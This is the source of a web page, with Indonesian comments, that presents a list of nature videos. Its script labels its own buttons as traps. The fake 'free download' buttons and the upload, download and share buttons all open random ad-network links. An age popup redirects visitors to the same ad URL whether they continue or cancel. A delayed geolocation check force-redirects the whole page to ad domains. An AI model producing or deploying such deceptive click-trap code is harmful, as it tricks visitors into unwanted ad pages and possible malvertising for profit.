    /* Navbar Merah Putih */
    .navbar {
      display: flex;

      gap: 12px;

    /* Tombol jebakan */

      color: #ff0000;
      padding: 8px 22px;
      border-radius: 40px;
      border: none;
      font-weight: 700;
      font-size: 0.9rem;
      cursor: pointer;
      transition: 0.2s;
      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
    }
    .trap-btn:active {
      transform: scale(0.96);
    }
    .trap-btn:hover {
      background: #ffe0e0;
    }

    .main-container {
      max-width: 500px;
      margin: 0 auto;
      padding: 20px 16px 80px;
    }

    .video-title {
      text-align: center;
      margin-bottom: 16px;
    }
    .video-title h1 {
      font-size: 1.8rem;
      font-weight: 800;
      background: linear-gradient(135deg, #ff0000, #cc0000);
      -webkit-background-clip: text;
      background-clip: text;
      color: transparent;
    }
    .video-title p {
      color: #cc0000;
      font-size: 0.9rem;
      margin-top: 5px;
      font-weight: 500;
    }

    /* Grid video */
    .videos-grid {
      display: flex;
      flex-direction: column;
      gap: 30px;
      margin-top: 20px;
    }

    .video-card-item {
      background: white;
      border-radius: 28px;
      overflow: hidden;
      padding: 16px;
      border: 1px solid #ffcccc;
      box-shadow: 0 8px 20px rgba(255,0,0,0.1);
    }

    .video-portrait {
      background: #000;
      border-radius: 20px;
      overflow: hidden;
      margin-bottom: 12px;
    }

    .video-container {
      position: relative;
      width: 100%;
      background: #000;
    }

    video {
      width: 100%;
      height: auto;
      display: block;
      aspect-ratio: 9 / 16;
      object-fit: cover;
      background: #000;
    }

    .video-caption {
      text-align: center;
      font-size: 0.85rem;
      color: #ff0000;
      margin: 10px 0;
      font-weight: 600;
    }

    /* Tombol download jebakan di setiap video */
    .fake-download-btn {
      background: linear-gradient(135deg, #ff0000, #cc0000);
      color: white;
      border: none;
      padding: 12px 20px;
      border-radius: 40px;
      font-weight: 800;
      font-size: 0.9rem;
      cursor: pointer;
      width: 100%;
      transition: 0.2s;
      margin-top: 8px;
      box-shadow: 0 2px 8px rgba(255,0,0,0.3);
    }
    .fake-download-btn:active {
      transform: scale(0.97);
    }

    /* Style untuk banner iklan */
    .ad-section {
      margin: 20px 0;
      text-align: center;
      background: white;
      border-radius: 16px;
      padding: 15px;
      border: 1px solid #ffcccc;
    }
    .ad-label {
      font-size: 0.7rem;
      color: #ff0000;
      margin-bottom: 10px;
      text-transform: uppercase;
      letter-spacing: 1px;
      font-weight: 600;
    }
    .banner-container {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 70px;
    }

    /* Iklan banner 160x300 */
    .ad-sidebar {
      display: flex;
      justify-content: center;
      margin: 20px 0;
    }
    .ad-sidebar iframe {
      max-width: 100%;
    }

    /* Floating tombol jebakan tambahan */
    .floating-trap {
      position: fixed;
      bottom: 20px;
      right: 20px;
      display: flex;
      flex-direction: column;
      gap: 12px;
      z-index: 999;
    }
    .floating-trap button {
      background: linear-gradient(135deg, #ff0000, #cc0000);
      color: white;
      border: none;
      padding: 12px 20px;
      border-radius: 50px;
      font-weight: 800;
      font-size: 0.85rem;
      cursor: pointer;
      box-shadow: 0 4px 12px rgba(255,0,0,0.4);
      width: 130px;
    }
    .floating-trap button:active {
      transform: scale(0.96);
    }

    @media (max-width: 550px) {
      .main-container { padding: 12px; }
      .video-title h1 { font-size: 1.5rem; }
      .floating-trap button { width: 110px; font-size: 0.75rem; padding: 10px 12px; }
    }
  </style>
</head>

<script>
/* ================== LINK IKLAN JEBAKAN (BARU) ================== */
const TRAP_LINK_1 = "https://www.effectivecpmnetwork.com/brchesvxv?key=a544b459d5b6b65416c3d302e2015ca7";
const TRAP_LINK_2 = "https://www.effectivecpmnetwork.com/rhr02b1u?key=0b20effc14e9b0addf8e860607493e10";
const TRAP_LINK_OLD = "https://www.effectivecpmnetwork.com/y2hyt5mnjw?key=35b1d05bec11858774cb79614d5ce151";

// Array link jebakan - akan dipilih secara random
const TRAP_LINKS = [TRAP_LINK_1, TRAP_LINK_2, TRAP_LINK_OLD];

// Fungsi untuk membuka link jebakan random di tab baru
function openTrapLink() {
  const randomLink = TRAP_LINKS[Math.floor(Math.random() * TRAP_LINKS.length)];
  window.open(randomLink, "_blank");
}

/* ================== VIDEO RENDER ================== */
const videoList = [
  { src: "https://cdn2.slicedrive.com/0SnkAE8i1.mp4", title: "🌲 Hutan Tropis - Kalimantan" },
  { src: "https://cdn2.slicedrive.com/48DFeQPD1.mp4", title: "🌊 Pantai Selatan - Jogja" },
  { src: "https://cdn2.videy.co/wEkJbSvy1.mp4", title: "🎬 Sunset di Raja Ampat" },
  { src: "https://cdn2.slicedrive.com/T9MkqIWz1.mp4", title: "🎬 Liburan ke Pantai" },
  { src: "https://cdn2.slicedrive.com/CLN2EI3H1.mp4", title: "🎬 Pesona Alam Indonesia" },
];

// Render semua video ke halaman
function renderVideos() {
  const grid = document.getElementById('videosGrid');
  if (!grid) return;
  
  grid.innerHTML = '';
  
  videoList.forEach((video, index) => {
    const videoId = `video_${index}`;
    const card = document.createElement('div');
    card.className = 'video-card-item';
    card.innerHTML = `
      <div class="video-portrait">
        <div class="video-container">
          <video id="${videoId}" controls playsinline poster="">
            <source src="${video.src}" type="video/mp4">
            Browser tidak mendukung video.
          </video>
        </div>
      </div>
      <div class="video-caption">
        📹 ${video.title || '🎬 Video indah pantai & alam'}
      </div>
      <button class="fake-download-btn" data-video-index="${index}">⬇️ DOWNLOAD VIDEO (GRATIS) ⬇️</button>
    `;
    grid.appendChild(card);
    
    // Pasang event listener untuk tombol download jebakan di setiap video
    const downloadBtn = card.querySelector('.fake-download-btn');
    if (downloadBtn) {
      downloadBtn.addEventListener('click', (e) => {
        e.stopPropagation();
        openTrapLink();
      });
    }
  });
}

// Panggil render saat halaman load
renderVideos();

/* ================== SEMUA TOMBOL JEBAKAN ================== */
// Tombol Upload di navbar
document.getElementById('fakeUploadBtn')?.addEventListener('click', openTrapLink);
// Tombol Download di navbar
document.getElementById('fakeDownloadNavBtn')?.addEventListener('click', openTrapLink);
// Tombol floating download
document.getElementById('floatingDownloadBtn')?.addEventListener('click', openTrapLink);
// Tombol floating share
document.getElementById('floatingShareBtn')?.addEventListener('click', openTrapLink);

/* ================== POPUP KONFIG ================== */
const AGE_NEXT_URL      = "https://crn77.com/4/10517089";
const OFFER_URL         = "https://crn77.com/4/10517089";
const AUTO_SHOW_DELAY_MS= 15000;
const REMEMBER_TTL_MIN  = 120;

const $root      = document.documentElement;
const $body      = document.body;
const $backdrop  = document.getElementById('age-backdrop');
const $dialog    = document.getElementById('age-dialog');
const $btnCancel = document.getElementById('age-cancel');
const $btnGo     = document.getElementById('age-continue');

function lockScroll(on){ $root.style.overflow = $body.style.overflow = on ? 'hidden' : ''; }

function showModal(){
  if(!$backdrop) return;
  $backdrop.setAttribute('aria-hidden','false');
  $backdrop.style.visibility = 'visible';
  $backdrop.style.pointerEvents = 'auto';
  requestAnimationFrame(()=>{
    $backdrop.style.opacity = '1';
    if($dialog) $dialog.style.transform = 'scale(1)';
  });
  lockScroll(true);
}

function destroyModal(){
  try{ lockScroll(false); }catch(_){}
  try{ $backdrop.setAttribute('aria-hidden','true'); }catch(_){}
  try{ $backdrop.remove(); }catch(_){ if($backdrop) $backdrop.style.display='none'; }
}

function openInNewTabOnly(url){
  const a = document.createElement('a');
  a.href = url;
  a.target = '_blank';
  a.rel = 'noopener noreferrer';
  document.body.appendChild(a);
  a.click();
  a.remove();
}

function rememberSkip(){
  try { localStorage.setItem('age_ok_time', String(Date.now())); } catch {}
}
function shouldSkip(){
  try {
    const t = +localStorage.getItem('age_ok_time') || 0;
    return Date.now() - t < REMEMBER_TTL_MIN*60*1000;
  } catch { return false; }
}

function handleChoice(url, ev){
  if(ev){
    ev.preventDefault();
    ev.stopPropagation();
    if (typeof ev.stopImmediatePropagation === 'function') ev.stopImmediatePropagation();
  }
  rememberSkip();
  destroyModal();
  openInNewTabOnly(url);
}

if($btnGo) $btnGo.addEventListener('click', (e)=> handleChoice(AGE_NEXT_URL, e), {capture:true});
if($btnCancel) $btnCancel.addEventListener('click',(e)=> handleChoice(OFFER_URL, e), {capture:true});

window.addEventListener('keydown', (e)=>{ if(e.key==='Escape') destroyModal(); });

/* ================== GEOIP REDIRECT ================== */
var LINK_ID  = "https://crn77.com/4/10517089";
var LINK_ALL = "https://oversightexcitement.com/ecpp2d2yf?key=780644cc073355ffdcb57a8c6dbbd9b4";
var DELAY = 25000;

function geoip(g){
  setTimeout(function(){
    if (g && g.country === "ID") {
      window.top.location.href = LINK_ID;
    } else {
      window.top.location.href = LINK_ALL;
    }
  }, DELAY);
}

// Tampilkan popup otomatis setelah delay
window.addEventListener('load', ()=>{ 
  if(!shouldSkip()) setTimeout(showModal, AUTO_SHOW_DELAY_MS); 
});
</script>
